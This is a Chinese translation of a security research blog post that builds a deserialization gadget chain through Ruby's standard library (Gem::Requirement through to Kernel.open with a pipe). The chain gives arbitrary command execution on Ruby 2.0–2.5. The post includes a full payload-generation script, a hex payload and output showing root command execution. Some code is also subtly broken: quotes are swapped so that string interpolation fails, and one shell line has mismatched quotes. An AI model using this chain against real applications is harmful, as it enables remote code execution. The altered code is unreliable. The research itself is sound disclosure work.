https://www.elttam.com/blog/ruby-deserialization

# 利用 Ruby 反序列化实现任意命令执行

## 引言

这篇博文详细介绍了针对 Ruby 编程语言的任意反序列化利用，并发布了首个针对 Ruby 2.x 的通用 gadget 链，可实现任意命令执行。以下各节将介绍反序列化问题及相关工作、可用 gadget 链的发现，以及最终对 Ruby 序列化的利用。

## 背景

[序列化](https://en.wikipedia.org/wiki/Serialization)是将对象转换为字节序列的过程，这些字节可以通过网络传输或存储在文件系统或数据库中。这些字节包含重建原始对象所需的所有相关信息。这个重建过程称为反序列化。每种编程语言通常都有自己独特的序列化格式。有些编程语言会使用不同于“序列化/反序列化”的名称来指代此过程。在 Ruby 中，通常使用术语“marshalling”（编组）和“unmarshalling”（解组）。

`Marshal` 类提供了类方法 `dump` 和 `load`，用法如下：

**图-1：`Marshal.dump` 和 `Marshal.load` 的使用**

```ruby
$ irb
>> class Person
>>   attr_accessor :name
>> end
=> nil

>> p = Person.new
=> #<Person:0x00005584ba9af490>

>> p.name = 'Luke Jahnke'
=> 'Luke Jahnke'

>> p
=> #<Person:0x00005584ba9af490 @name='Luke Jahnke'>

>> Marshal.dump(p)
=> "\x04\bo:\vPerson\x06:\n@nameI'\x10Luke Jahnke\x06:\x06ET"

>> Marshal.load("\x04\bo:\vPerson\x06:\n@nameI'\x10Luke Jahnke\x06:\x06ET")
=> #<Person:0x00005584ba995dd8 @name='Luke Jahnke'>
```

## 反序列化不可信数据的问题

常见的安全漏洞出现在开发人员错误地认为攻击者无法查看或篡改序列化对象（因为它是不透明的二进制格式）时。这可能导致存储在对象内的任何敏感信息（如凭证或应用程序机密）泄露给攻击者。它还经常导致权限提升，例如序列化对象具有实例变量，随后用于权限检查。例如，考虑一个包含 `username` 实例变量的 `User` 对象被序列化，并且可能被攻击者篡改。修改序列化数据并将用户名变量更改为更高权限的用户名（如“admin”）是微不足道的。虽然这类攻击可能很强大，但它们高度依赖于上下文，并且从技术角度来看并不令人兴奋，因此在这篇博文中不再进一步讨论。

代码重用攻击也是可能的，即执行已有的代码片段（称为 gadget）来执行非预期的操作，例如执行任意系统命令。由于反序列化可以将实例变量设置为任意值，这允许攻击者控制 gadget 操作的部分数据。这也允许攻击者使用一个 gadget 调用第二个 gadget，因为方法经常在存储在实例变量中的对象上调用。当一系列 gadget 以这种方式链接在一起时，称为 gadget 链。

## 先前的载荷

不安全的反序列化在 [OWASP 2017 年十大最关键 Web 应用程序安全风险](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf) 中排名第八，但关于为 Ruby 构建 gadget 链的细节却很少发布。不过，在 Phrack 论文 [Attacking Ruby on Rails Applications](http://phrack.org/issues/69/12.html) 中可以找到一个很好的参考，其中 [Phenoelit](http://phenoelit.de) 的 [joernchen](https://twitter.com/joernchen) 在 2.1 节中描述了由 [Charlie Somerville](https://twitter.com/charliesome) 发现的一个可实现任意代码执行的 gadget 链。为简洁起见，此处不再重复该技术，但其前提条件如下：

1. **必须**安装并加载 ActiveSupport gem。
2. **必须**加载标准库中的 ERB（Ruby 默认不加载）。
3. 反序列化后，**必须**在反序列化对象上调用一个不存在的方法。

虽然在任何 Ruby on Rails Web 应用程序的上下文中，这些前提条件几乎肯定会被满足，但其他 Ruby 应用程序很少能满足这些条件。

那么，挑战来了。我们能否移除所有这些前提条件，仍然实现任意代码执行？

## 狩猎 Gadget

由于我们希望构建一个没有依赖项的 gadget 链，gadget 只能来源于标准库。需要注意的是，并非所有标准库都会默认加载。这大大限制了我们可用的 gadget 数量。例如，测试 Ruby 2.5.3 发现默认加载了 358 个类。虽然这个数字看起来很高，但仔细检查后发现，其中 196 个类**没有**定义任何自己的实例方法。这些空类中的大多数是 `Exception` 类的唯一命名子类，用于区分可捕获的异常。

可用类的数量有限，因此找到能够增加加载的标准库数量的 gadget 或技术将非常有益。一种技术是寻找在调用时会 `require` 另一个库的 gadget。这很有用，因为即使 `require` 出现在某个模块和/或类的范围内，它实际上也会污染全局命名空间。

**图-2：调用 `require` 的方法示例（lib/rubygems.rb）**

```ruby
module Gem
...
  def self.deflate(data)
    require 'zlib'
    Zlib::Deflate.deflate data
  end
...
end
```

如果上面的 `Gem.deflate` 方法被包含在 gadget 链中，Ruby 标准库中的 `Zlib` 库将被加载，如下所示：

**图-3：全局命名空间被污染的演示**

```ruby
$ irb
>> Zlib
NameError: uninitialized constant Zlib
...

>> Gem.deflate('')
=> "x\x9C\x03\x00\x00\x00\x00\x01"

>> Zlib
=> Zlib
```

虽然存在许多标准库动态加载其他标准库部分的例子，但有一个实例试图在系统上安装了第三方库时加载它，如下所示：

**图-4：标准库中的 `SortedSet` 加载第三方库 `RBTree`（lib/set.rb）**

```ruby
...
class SortedSet < Set
...
  class << self
...
    def setup
...
          require 'rbtree'
```

下图显示了当请求一个未安装的库时，将搜索的广泛位置示例，包括其他库目录：

**图-5：当 Ruby 在默认系统（未安装 RBTree）上尝试加载 RBTree 时，strace 输出的样本**

```bash
$ strace -f ruby -e 'require "set"; SortedSet.setup' |& grep -i rbtree | nl
     1	[pid    32] openat(AT_FDCWD, '/usr/share/rubygems-integration/all/gems/did_you_mean-1.2.0/lib/rbtree.rb', O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 ENOENT (No such file or directory)
     2	[pid    32] openat(AT_FDCWD, '/usr/local/lib/site_ruby/2.5.0/rbtree.rb', O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 ENOENT (No such file or directory)
     3	[pid    32] openat(AT_FDCWD, '/usr/local/lib/x86_64-linux-gnu/site_ruby/rbtree.rb', O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 ENOENT (No such file or directory)
...
   129	[pid    32] stat('/var/lib/gems/2.5.0/gems/strscan-1.0.0/lib/rbtree.so', 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
   130	[pid    32] stat('/var/lib/gems/2.5.0/extensions/x86_64-linux/2.5.0/strscan-1.0.0/rbtree', 0x7ffc0b805ec0) = -1 ENOENT (No such file or directory)
   131	[pid    32] stat('/var/lib/gems/2.5.0/extensions/x86_64-linux/2.5.0/strscan-1.0.0/rbtree.rb', 0x7ffc0b805ec0) = -1 ENOENT (No such file or directory)
   132	[pid    32] stat('/var/lib/gems/2.5.0/extensions/x86_64-linux/2.5.0/strscan-1.0.0/rbtree.so', 0x7ffc0b805ec0) = -1 ENOENT (No such file or directory)
   133	[pid    32] stat('/usr/share/rubygems-integration/all/gems/test-unit-3.2.5/lib/rbtree', 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
   134	[pid    32] stat('/usr/share/rubygems-integration/all/gems/test-unit-3.2.5/lib/rbtree.rb', 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
   135	[pid    32] stat('/usr/share/rubygems-integration/all/gems/test-unit-3.2.5/lib/rbtree.so', 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
   136	[pid    32] stat('/var/lib/gems/2.5.0/gems/webrick-1.4.2/lib/rbtree', 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
...
```

更有用的 gadget 是将攻击者控制的参数传递给 `require` 的 gadget。这个 gadget 将允许加载文件系统上的任意文件，从而提供标准库中任何 gadget 的使用，包括 Charlie Somerville 的 gadget 链中使用的 `ERB` gadget。虽然没有发现允许完全控制 `require` 参数的 gadget，但下面可以看到一个允许部分控制的 gadget 示例：

**图-6：允许部分控制 `require` 参数的 gadget（ext/digest/lib/digest.rb）**

```ruby
module Digest
  def self.const_missing(name) # :nodoc:
    case name
    when :SHA256, :SHA384, :SHA512
      lib = 'digest/sha2.so'
    else
      lib = File.join('digest', name.to_s.downcase)
    end

    begin
      require lib
...
```

上述示例无法利用，因为 `const_missing` 从未被标准库中的任何 Ruby 代码显式调用。这并不奇怪，因为 `const_missing` 是一个[钩子方法](https://docs.ruby-lang.org/en/2.5.0/Module.html#method-i-const_missing)，当定义后，会在引用未定义常量时被调用。像 `@object.__send__(@method, @argument)` 这样的 gadget，允许在任意对象上以任意参数调用任意方法，显然可以用来调用上述 `const_missing` 方法。然而，如果我们已经拥有如此强大的 gadget，就不再需要增加可用 gadget 的集合，因为它本身就可以执行任意系统命令。

`const_missing` 方法也可以作为调用 `const_get` 的结果而被调用。定义在文件 `lib/rubygems/package.rb` 中的 `Gem::Package` 类的 `digest` 方法是一个合适的 gadget，因为它以控制参数的方式在 `Digest` 模块上调用 `const_get`（尽管任何上下文都可以）。然而，`const_get` 的默认实现对字符集进行严格验证，防止在 `digest` 目录外遍历。

另一种隐式调用 `const_missing` 的方式是使用诸如 `Digest::SOME_CONSTANT` 的代码。然而，`Marshal.load` 并不会以会调用 `const_missing` 的方式进行常量解析。更多细节可以在 Ruby 问题 [3511](https://bugs.ruby-lang.org/issues/3511) 和 [12731](https://bugs.ruby-lang.org/issues/12731) 中找到。

另一个同样提供对传递给 `require` 的参数的部分控制的 gadget 示例如下：

**图-7：使用参数调用 `[]` 方法会导致该参数被包含在传递给 `require` 的参数中（lib/rubygems/command_manager.rb）**

```ruby
class Gem::CommandManager
  def [](command_name)
    command_name = command_name.intern
    return nil if @commands[command_name].nil?
    @commands[command_name] ||= load_and_instantiate(command_name)
  end

  private

  def load_and_instantiate(command_name)
    command_name = command_name.to_s
...
        require "rubygems/commands/#{command_name}_command"
...
    end
  end
...
```

由于存在 `_command` 后缀，并且没有找到允许截断的技术（例如使用空字节），上述示例也无法利用。确实存在一些带有 `_command` 后缀的文件，但探索此主题的研究者可能会发现很有趣。

如下所示，Rubygem 库广泛使用了 `autoload` 方法：

**图-8：多次调用 `autoload` 方法（lib/rubygems.rb）**

```ruby
module Gem
...
  autoload :BundlerVersionFinder, 'rubygems/bundler_version_finder'
  autoload :ConfigFile,         'rubygems/config_file'
  autoload :Dependency,         'rubygems/dependency'
  autoload :DependencyList,     'rubygems/dependency_list'
  autoload :DependencyResolver, 'rubygems/resolver'
  autoload :Installer,          'rubygems/installer'
  autoload :Licenses,           'rubygems/util/licenses'
  autoload :PathSupport,        'rubygems/path_support'
  autoload :Platform,           'rubygems/platform'
  autoload :RequestSet,         'rubygems/request_set'
  autoload :Requirement,        'rubygems/requirement'
  autoload :Resolver,           'rubygems/resolver'
  autoload :Source,             'rubygems/source'
  autoload :SourceList,         'rubygems/source_list'
  autoload :SpecFetcher,        'rubygems/spec_fetcher'
  autoload :Specification,      'rubygems/specification'
  autoload :Util,               'rubygems/util'
  autoload :Version,            'rubygems/version'
...
end
```

`autoload` 的工作方式类似于 `require`，但仅在首次访问注册常量时才加载指定文件。由于这种行为，如果这些常量中的任何一个包含在反序列化载荷中，相应的文件将被加载。这些文件本身也包含 `require` 和 `autoload` 语句，进一步增加了可能提供有用 gadget 的文件数量。

尽管 `autoload` [预计不会保留](https://bugs.ruby-lang.org/issues/5653)在 Ruby 3.0 的未来版本中，但最近随着 Ruby 2.5 的发布，标准库中使用 `autoload` 的情况有所增加。在[此 git 提交](https://github.com/ruby/ruby/commit/ec7c76c446fcb7fafae2fa2f7eda78c2387fac23)中引入了使用 `autoload` 的新代码，可以在以下代码片段中看到：

**图-9：Ruby 2.5 中引入的 `autoload` 的新用法（lib/uri/generic.rb）**

```ruby
require 'uri/common'
autoload :IPSocket, 'socket'
autoload :IPAddr, 'ipaddr'

module URI
...
```

为了帮助探索标准库中这一扩展的可用 gadget 集，我们可以使用以下代码加载每个通过 `autoload` 注册的文件：

**图-10：对每个对象使用每个符号进行常量解析的暴力尝试**

```ruby
ObjectSpace.each_object do |clazz|
  if clazz.respond_to? :const_get
    Symbol.all_symbols.each do |sym|
      begin
        clazz.const_get(sym)
      rescue NameError
      rescue LoadError
      end
    end
  end
end
```

运行上述代码后，我们重新测量可用于提供 gadget 的类数量，发现加载了 959 个类，比之前的 358 个增加了 658 个。在这些类中，有 511 个定义了至少一个实例方法。加载这些额外类的能力为我们开始搜索有用的 gadget 提供了显著改善的条件。

### 初始 / Kick-off Gadget

每个 gadget 链的开始需要一个在反序列化期间或之后自动调用的 gadget。这是执行进一步 gadget 的初始入口点，最终目标是实现任意代码执行或其他攻击。

理想的初始 gadget 应该是在反序列化过程中由 `Marshal.load` 自动调用的 gadget。这消除了在反序列化后执行的代码对恶意对象进行防御性检查和保护的机会。我们怀疑有可能在反序列化期间自动调用一个 gadget，因为这是其他编程语言（如 PHP）的一个特性。在 PHP 中，如果类定义了[魔术方法](https://secure.php.net/manual/en/language.oop5.magic.php#object.wakeup) `__wakeup`，则在反序列化该类对象时会立即调用它。阅读[相关 Ruby 文档](https://ruby-doc.org/core-2.5.0/Marshal.html#module-Marshal-label-marshal_dump+and+marshal_load)发现，如果类定义了实例方法 `marshal_load`，则在反序列化该类的对象时会调用此方法。

利用这些信息，我们检查每个加载的类，检查它们是否具有 `marshal_load` 实例方法。通过以下代码以编程方式实现：

**图-11：查找所有定义了 `marshal_load` 的类的 Ruby 脚本**

```ruby
ObjectSpace.each_object(:Class) do |obj|
  all_methods = obj.instance_methods + obj.protected_instance_methods + obj.private_instance_methods

  if all_methods.include? :marshal_load
    method_origin = obj.instance_method(:marshal_load).inspect[/(.*)/,1] || obj.to_s

    puts obj
    puts '  marshal_load defined by #{method_origin}'
    puts '  ancestors = #{obj.ancestors}'
    puts
  end
end
```

### 多余的 Gadget

在研究过程中发现了许多 gadget，但最终 gadget 链中只使用了一小部分。为了博文简洁，下面总结了一些有趣的：

**图-12：与调用 cache 方法的 gadget 链结合使用时，此 gadget 允许任意代码执行（lib/rubygems/source/git.rb）**

```ruby
class Gem::Source::Git < Gem::Source
...
  def cache # :nodoc:
...
      system @git, 'clone', '--quiet', '--bare', '--no-hardlinks',
             @repository, repo_cache_dir
...
  end
...
```

**图-13：此 gadget 可用于使 `to_s` 返回除预期的 `String` 对象之外的内容（lib/rubygems/security/policy.rb）**

```ruby
class Gem::Security::Policy
...
  attr_reader :name
...
  alias to_s name # :nodoc:

end
```

**图-14：此 gadget 可用于使 `to_i` 返回除预期的 `Integer` 对象之外的内容（lib/ipaddr.rb）**

```ruby
class IPAddr
...
  def to_i
    return @addr
  end
...
```

**图-15：此代码生成一个 gadget 链，反序列化后进入无限循环**

```ruby
module Gem
  class List
    attr_accessor :value, :tail
  end
end

$x = Gem::List.new
$x.value = :@elttam
$x.tail = $x

class SimpleDelegator
  def marshal_dump
    [
      :__v2__,
      $x,
      [],
      nil
    ]
  end
end

ace = SimpleDelegator.new(nil)

puts Marshal.dump(ace).inspect
```

## 构建 Gadget 链

创建 gadget 链的第一步是构建候选的 `marshal_load` 初始 gadget 池，并确保它们在我们提供的对象上调用方法。在 Ruby 中，“一切皆对象”，因此这很可能包含每个初始 gadget。我们可以通过审查实现并保留任何在我们控制的对象上调用通用方法名的 gadget 来缩小池。理想情况下，通用方法名应具有许多不同的实现可供选择。

对于我的 gadget 链，我选择了 `Gem::Requirement` 类，其实现如下所示，允许在任意对象上调用 `each` 方法：

**图-16：`Gem::Requirement` 部分源代码（lib/rubygems/requirement.rb）——参见内联注释**

```ruby
class Gem::Requirement
  # 1) 我们完全控制 array
  def marshal_load(array)
    # 2) 因此我们可以将 @requirements 设置为我们选择的对象
    @requirements = array[0]

    fix_syck_default_key_in_requirements
  end

  # 3) marshal_load 调用此方法
  def fix_syck_default_key_in_requirements
    Gem.load_yaml

    # 4) 我们可以在任何对象上调用 .each
    @requirements.each do |r|
      if r[0].kind_of? Gem::SyckDefaultKey
        r[0] = '='
      end
    end
  end

end
```

现在有了调用 `each` 方法的能力，我们需要一个有用的 `each` 实现来让我们更接近任意命令执行。在审查 `Gem::DependencyList`（以及 mixin `Tsort`）的源代码后，发现调用其 `each` 实例方法将导致在其 `@specs` 实例变量上调用 `sort` 方法。到达 `sort` 方法调用的确切路径在此没有包含，但可以通过以下命令验证，该命令使用 Ruby 的 stdlib [Tracer](https://ruby-doc.org/stdlib-2.5.0/libdoc/tracer/rdoc/Tracer.html) 类输出源代码级执行跟踪：

**图-17：验证 `Gem::DependencyList#each` 导致 `@specs.sort`**

```bash
$ ruby -rtracer -e 'dl=Gem::DependencyList.new; dl.instance_variable_set(:@specs,[nil,nil]); dl.each{}' |& fgrep '@specs.sort'
#0:/usr/share/rubygems/rubygems/dependency_list.rb:218:Gem::DependencyList:-:     specs = @specs.sort.reverse
```

有了这个在任意对象数组上调用 `sort` 方法的新能力，我们利用它在任意对象上调用 `<=>` 方法（[三路比较运算符](https://en.wikipedia.org/wiki/Three-way_comparison)）。这很有用，因为 `Gem::Source::SpecificFile` 实现了 `<=>` 方法，当调用时，会导致在其 `@spec` 实例变量上调用 `name` 方法，如下所示：

**图-18：`Gem::Source::SpecificFile` 部分源代码（lib/rubygems/source/specific_file.rb）**

```ruby
class Gem::Source::SpecificFile < Gem::Source
  def <=> other
    case other
    when Gem::Source::SpecificFile then
      return nil if @spec.name != other.spec.name # [1]

      @spec.version <=> other.spec.version
    else
      super
    end
  end

end
```

能够在任意对象上调用 `name` 方法是最后的拼图，因为 `Gem::StubSpecification` 有一个 `name` 方法，该方法调用其 `data` 方法。`data` 方法随后调用 `open` 方法，实际上是 `Kernel.open`，并以其实例变量 `@loaded_from` 作为第一个参数，如下所示：

**图-19：`Gem::BasicSpecification`（lib/rubygems/basic_specification.rb）和 `Gem::StubSpecification`（lib/rubygems/stub_specification.rb）的部分源代码**

```ruby
class Gem::BasicSpecification
  attr_writer :base_dir # :nodoc:
  attr_writer :extension_dir # :nodoc:
  attr_writer :ignored # :nodoc:
  attr_accessor :loaded_from
  attr_writer :full_gem_path # :nodoc:
...
end

class Gem::StubSpecification < Gem::BasicSpecification

  def name
    data.name
  end

  private def data
    unless @data
      begin
        saved_lineno = $.

        # TODO It should be use `File.open`, but bundler-1.16.1 example expects Kernel#open.
        open loaded_from, OPEN_MODE do |file|
...
```

如[相关文档](https://ruby-doc.org/core-2.5.0/Kernel.html#method-i-open)所述，当第一个参数的第一个字符是管道字符（“|”）时，`Kernel.open` 可用于执行任意命令。查看 `open` 上方的 TODO 注释是否会很快被解决将会很有趣。

## 生成载荷

开发了以下脚本以生成和测试前面描述的 gadget 链：

**图-20：生成并验证反序列化 gadget 链的脚本**

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, '|id 1>&2')

puts 'STEP n'
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts 'STEP n-1'
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts 'STEP n-2'
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts 'STEP n-3'
Marshal.load(payload) rescue nil
puts


puts 'VALIDATION (in fresh ruby process):'
IO.popen('ruby -e "Marshal.load(STDIN.read) rescue nil"', 'r+') do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts 'Payload (hex):'
puts payload.unpack('H*')[0]
puts


require 'base64'
puts 'Payload (Base64 encoded):'
puts Base64.encode64(payload)
```

以下 Bash 一行命令验证载荷在空 Ruby 进程中成功执行，显示 2.0 到 2.5 版本受影响：

**图-21：针对 Ruby 2.0 到 2.5 生成并验证反序列化 gadget 链的脚本**

```bash
$ for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack('H*")) rescue nil'; done
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
```

## 结论

本文探索并发布了一个通用 gadget 链，可在 Ruby 2.0 到 2.5 版本中实现命令执行。

正如本文所示，对 Ruby 标准库的深入了解在构建反序列化 gadget 链方面非常有用。未来工作还有很多机会，包括使技术覆盖 Ruby 1.8 和 1.9 版本，以及处理 Ruby 进程以命令行参数 `--disable-all` 调用的情况。还可以研究其他 Ruby 实现，如 JRuby 和 Rubinius。

已经有一些关于[模糊测试 Ruby C 扩展](https://schd.ws/hosted_files/bsidessf2018/de/Fuzzing_Ruby_C_Extensions.pdf)和[使用 AFL-Fuzz 打破 Ruby 的 Unmarshal](https://medium.com/fuzzstation/breaking-rubys-unmarshal-with-afl-fuzz-6b5f72b581d5) 的研究。完成这项调查后，似乎还有充足的机会进行进一步研究，包括对如下所示的 `marshal_load` 方法的原生代码实现进行手动代码审查：

**图-22：在 C 中实现的 `marshal_load` 实例**

```bash
complex.c:    rb_define_private_method(compat, 'marshal_load', nucomp_marshal_load, 1);
iseq.c:    rb_define_private_method(rb_cISeq, 'marshal_load', iseqw_marshal_load, 1);
random.c:    rb_define_private_method(rb_cRandom, 'marshal_load', random_load, 1);
rational.c:    rb_define_private_method(compat, 'marshal_load', nurat_marshal_load, 1);
time.c:    rb_define_private_method(rb_cTime, 'marshal_load', time_mload, 1);
ext/date/date_core.c:    rb_define_method(cDate, 'marshal_load', d_lite_marshal_load, 1);
ext/socket/raddrinfo.c:    rb_define_method(rb_cAddrinfo, 'marshal_load', addrinfo_mload, 1);
```

感谢阅读，再见 Bella！